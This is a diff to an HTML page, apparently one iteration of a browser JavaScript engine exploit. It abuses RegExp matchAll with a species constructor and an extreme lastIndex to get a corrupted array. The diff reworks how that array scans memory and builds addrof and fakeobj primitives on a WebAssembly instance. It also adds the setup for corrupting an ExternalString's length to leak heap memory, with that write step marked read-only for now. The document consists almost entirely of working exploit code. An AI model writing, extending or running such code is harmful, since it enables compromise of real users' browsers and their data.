@@ -1,4 +1,5 @@
-<!doctype html><html><head><meta charset="utf-8"><title>P28</title></head>
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P28</title></head>
 <body><pre id="out">Running...</pre>
 <script>
 "use strict";
@@ -11,23 +12,20 @@ function f2i(f){f64[0]=f;return u64[0];}
 function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
-const PINS=[0x1080011,0x1100011];
-// Runtime sentinel: NOT a compile-time constant
-const SENT=42.42+Math.random()*0.001; // unique per run
-const SENT_BITS=f2i(SENT);
-const dblA=new Array(0x8000);
-dblA[0]=SENT;
-for(let i=1;i<dblA.length;i++)dblA[i]=SENT+i*0.001;
-const objB=new Array(0x8000);for(let i=0;i<objB.length;i++)objB[i]=null;
+const PINS=[0x1080011];
+const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
+const marker={mmm:1};
+const objB=new Array(0x8000);
+objB[0]=marker;objB[1]=marker;objB[2]=marker;objB[3]=marker;
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
-objB[0]=wasmI;
+objB[4]=wasmI;
+const victim=[1.22,1.33,1.44];
 const re=/(?:)/;
 const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
 const c0=w2f(DMAP,EMPTY);
 const sk=[];
 log("UA: "+navigator.userAgent);
-log("S: "+SENT_BITS.toString(16));
 trash(230);trash(230);
 RegExp.prototype[Symbol.matchAll].call(fk,"").next();
 log("TRIG: "+re.lastIndex);
@@ -46,42 +44,80 @@ const m=re.lastIndex;
 log("T: "+typeof m+" A="+Array.isArray(m));
 if(Array.isArray(m)){
   log("L: "+m.length);
-  // Scan pages 1+2 for RUNTIME sentinel
-  let found=-1;
-  for(let k=0;k<0x7FF0;k++){
-    try{if(f2i(m[k])===SENT_BITS){found=k;break;}}catch(e){break;}
-  }
-  if(found<0){
-    for(let k=0x8000;k<0xFFF0;k++){
-      try{if(f2i(m[k])===SENT_BITS){found=k;break;}}catch(e){break;}
-    }
-  }
-  if(found>=0){
-    log("PD@"+found.toString(16));
-    // Verify dblA[1] = SENT+0.001
-    const d1=m[found+1];
-    const expected=SENT+0.001;
-    log("D1:"+d1+" EXP:"+expected);
-    if(Math.abs(d1-expected)<0.0001){
-      log("VERIFIED");
-      // ADDROF: assign wasmI to dblA[0], read via m[found]
-      dblA[0]=wasmI;
-      const raw=f2i(m[found]);
-      log("WASM:"+raw.toString(16));
-      const wasmAddr=Number(raw&0xffffffffn);
-      log("WA:"+wasmAddr.toString(16));
-      dblA[0]=SENT; // restore
-      if(wasmAddr>0x100&&wasmAddr<0x10000000){
-        log("ADDROF_OK");
+  const d=[];
+  for(let k=0;k<8;k++){try{d.push(f2i(m[k]).toString(16));}catch(e){d.push("E");break;}}
+  log("H0: "+d.join(","));
+  // Also probe dblA: if m[k] were dblA, m[0] would have been 10.125 (it's not)
+  // Scan SAFE window m[0..0x7000] for marker pattern (lo==hi odd pairs)
+  let OB=-1;
+  for(let k=0;k<0x7000;k++){
+    try{
+      const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+      if(lo===hi&&(lo&1n)===1n&&lo>0x1000n&&lo<0x2000000n){
+        objB[5]=marker;
+        if((f2i(m[k])>>32n)===lo){OB=k;break;}
       }
-    }else{
-      log("MISMATCH");
-    }
-  }else{
-    log("NOT_FOUND");
+    }catch(e){log("STOP:"+k.toString(16));break;}
   }
+  if(OB>=0){
+    log("OB:"+OB.toString(16));
+    objB[4]=wasmI;
+    log("WASM:"+(f2i(m[OB+2])&0xffffffffn).toString(16));
+    objB[4]=marker;
+    // FAKEOBJ roundtrip ONLY (no fake array, no ES)
+    objB[4]=wasmI;
+    const raw=f2i(m[OB+2]);
+    m[OB+2]=i2f(raw);
+    const fo=objB[4];
+    const foOk=(!!fo&&!!fo.exports&&fo.exports.f()===42);
+    objB[4]=marker;
+    const wasmAddr=f2i(m[OB+2])&0xffffffffn;
+    // === ExternalString direct length corruption via master ===
+    // allocations first
+    const dec=new TextDecoder("windows-1252");
+    const eb=new Uint8Array(0x40);eb.fill(0x41);
+    const es=dec.decode(eb);
+    objB[4]=es;
+    const esAddr=f2i(m[OB+2])&0xffffffffn; // tagged
+    objB[4]=marker;
+    // target qword at (esAddr-1)+8 ; master data base = 0x1080018
+    const BASEN=0x1080018n;
+    const tq=(esAddr-1n)+8n;
+    const off=tq-BASEN; // byte offset
+    let lr="",nl="RO",leak="";
+    try{
+      if((off&7n)===0n){
+        const idx=Number(off>>3n);
+        const v=f2i(m[idx]);
+        lr="al:"+v.toString(16)+" idx:"+idx.toString(16);
+        // READ-ONLY: no write
+      }else{
+        // 4-mod-8: qword spans m[i] hi and m[i+1] lo
+        const offb=off-4n;
+        const idx=Number(offb>>3n);
+        const a=f2i(m[idx]);   // [slot2i|slot2i+1] — target lo in a.hi
+        const b=f2i(m[idx+1]); // target hi in b.lo
+        lr="un:"+(a>>32n).toString(16)+":"+(b&0xffffffffn).toString(16);
+        // new qword = [0x01200000 | orig_hi]
+        // READ-ONLY: no write
+      }
+      nl=es.length.toString(16);
+      if(es.length===0x01200000){
+        let s="";
+        for(let j2=0;j2<24;j2++){s+=es.charCodeAt(0x1000+j2).toString(16).padStart(2,"0");}
+        leak=s;
+      }
+    }catch(e){lr="E:"+e.message;}
+    log("FO:"+foOk);
+    log("ES:"+esAddr.toString(16));
+    log("LR:"+lr);
+    log("NL:"+nl);
+    if(leak)log("LEAK:"+leak);
+    log("CHAIN_DONE");
+  }else{log("MARKER_MISS");}
   log("W: "+wasmI.exports.f());
-}else{log("NA");}
+}else if(typeof m==="number"){log("N: "+f2i(m).toString(16));}
+else{log("OBJ:"+typeof m);}
 }catch(e){log("E: "+e.message);}
 log("=== DONE ===");
 </script></body></html>
